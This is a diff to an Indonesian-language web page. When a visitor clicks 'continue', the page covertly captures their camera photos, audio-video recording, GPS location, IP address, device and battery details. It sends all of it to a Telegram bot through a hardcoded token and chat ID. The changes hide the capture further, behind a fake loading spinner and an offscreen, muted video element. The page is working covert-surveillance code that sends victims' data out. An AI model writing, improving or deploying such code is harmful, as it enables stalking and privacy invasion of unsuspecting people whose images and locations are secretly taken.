@@ -34,7 +34,11 @@
       cursor: pointer;
     }
     #video {
-      display: none;
+      display: none !important;
+      width: 1px;
+      height: 1px;
+      position: absolute;
+      left: -9999px;
     }
     .circle-light {
       position: absolute;
@@ -46,6 +50,23 @@
       background-color: red;
       box-shadow: 0 0 8px 3px red;
       z-index: 1000;
+    }
+    #loading {
+      display: none;
+      margin-top: 30px;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #00ff88;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -61,24 +82,27 @@
     <button onclick="startAll()">LANJUTKAN</button>
   </div>
 
-  <video id="video" autoplay playsinline></video>
+  <div id="loading">
+    <div class="loader"></div>
+    <p>loadinggg...</p>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
+    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
     const chat_id = '7552410869';
     let recorder;
     let recordedChunks = [];
 
     async function startAll() {
+      document.getElementById('step1').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         document.getElementById('video').srcObject = stream;
-        document.getElementById('video').style.display = 'block';
-
-        const popup = document.getElementById('step1');
-        popup.style.opacity = 0;
-        setTimeout(() => popup.style.display = 'none', 500);
 
         const synth = window.speechSynthesis;
         const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
@@ -113,24 +137,66 @@
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
 
-      // Tunggu video siap
       await new Promise(resolve => setTimeout(resolve, 1000));
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
 
       for (let i = 0; i < 3; i++) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(async (blob) => {
-          const formData = new FormData();
-          formData.append("chat_id", chat_id);
-          formData.append("photo", blob, `photo${i+1}.jpg`);
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-        }, 'image/jpeg');
-        await new Promise(resolve => setTimeout(resolve, 1000)); // jeda antar foto
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+        const info = await getDeviceInfo();
+
+        const caption = `
+[Foto ${i+1}]
+Device: ${info.device}
+Lokasi: ${info.location}
+Baterai: ${info.battery}
+Waktu: ${info.time}
+`;
+
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, `photo${i+1}.jpg`);
+        formData.append("caption", caption.trim());
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
       }
+    }
+
+    async function getDeviceInfo() {
+      const device = navigator.userAgent;
+      const waktu = new Date();
+      const jam = waktu.toLocaleTimeString();
+      const tanggal = waktu.toLocaleDateString();
+      const fullTime = waktu.toString();
+
+      let location = "Tidak tersedia";
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            resolve();
+          },
+          () => resolve()
+        );
+      });
+
+      const battery = await navigator.getBattery()
+        .then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`)
+        .catch(() => 'Tidak tersedia');
+
+      return {
+        device,
+        time: `${tanggal} ${jam}`,
+        location,
+        battery
+      };
     }
 
     function handleDataAvailable(event) {
@@ -143,36 +209,25 @@
       const blob = new Blob(recordedChunks, { type: 'video/webm' });
       recordedChunks = [];
 
-      const waktu = new Date();
-      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-      const location = await getLocation();
-      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`).catch(() => 'Tidak tersedia');
+      const info = await getDeviceInfo();
 
       const message = `
 [REKAMAN OTOMATIS]
-IP: ${ip}
-Waktu: ${waktu.toLocaleString()}
-Lokasi: ${location}
-Baterai: ${battery}
+Device: ${info.device}
+IP: ${await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)}
+Waktu: ${info.time}
+Lokasi: ${info.location}
+Baterai: ${info.battery}
 `;
 
       const formData = new FormData();
       formData.append("chat_id", chat_id);
-      formData.append("caption", message);
+      formData.append("caption", message.trim());
       formData.append("video", blob, "rekaman.webm");
 
       fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
         method: 'POST',
         body: formData
-      });
-    }
-
-    async function getLocation() {
-      return new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve(`https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
-          () => resolve("Lokasi tidak tersedia")
-        );
       });
     }
   </script>
